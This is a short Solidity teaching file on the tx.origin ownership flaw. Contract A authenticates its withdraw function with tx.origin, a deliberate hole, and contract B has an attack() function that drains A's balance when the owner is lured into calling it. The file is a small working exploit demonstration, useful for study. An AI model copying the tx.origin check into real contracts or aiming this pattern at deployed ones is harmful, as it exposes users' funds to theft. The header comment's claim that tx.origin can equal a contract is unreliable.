// SPDX-License-Identifier: MIT

pragma solidity ^0.8.13;

/*
. while using tx.origin for checking validation, we have to take
  extra care.
. when ContractA call ContractB in case of B => msg.sender = ConttractA
. when A call B and B call C => In C msg.sender = ContractB
                                     tx.origin = ContractA



 . In below example contaract owner using tx.origin to validate ownership
   and withdraw, so it this open to exploit                                    
*/

contract A{
    address payable public owner;

    event Log(address sender, uint value);

    modifier onlyOwner{
        require(tx.origin == owner, "Not owner");
        _;
    }

    constructor(){
        owner = payable(msg.sender);
    }

    receive() external payable{
    
    }

    function deposit() public payable{
        emit Log(msg.sender, msg.value);
    }

    function withdraw() external onlyOwner{
        (bool succ, ) = payable(msg.sender).call{value: address(this).balance}("");
        require(succ, "Tx Failed");
    }

    function balance() external view returns (uint){
        return address(this).balance;
    }
}

contract B{
    A add;

    constructor(A _add){
        add = A(_add);
    }
    receive() external payable{}

    function attack() external{
        add.withdraw();
    }

    function balance() external view returns (uint){
        return address(this).balance;
    }
}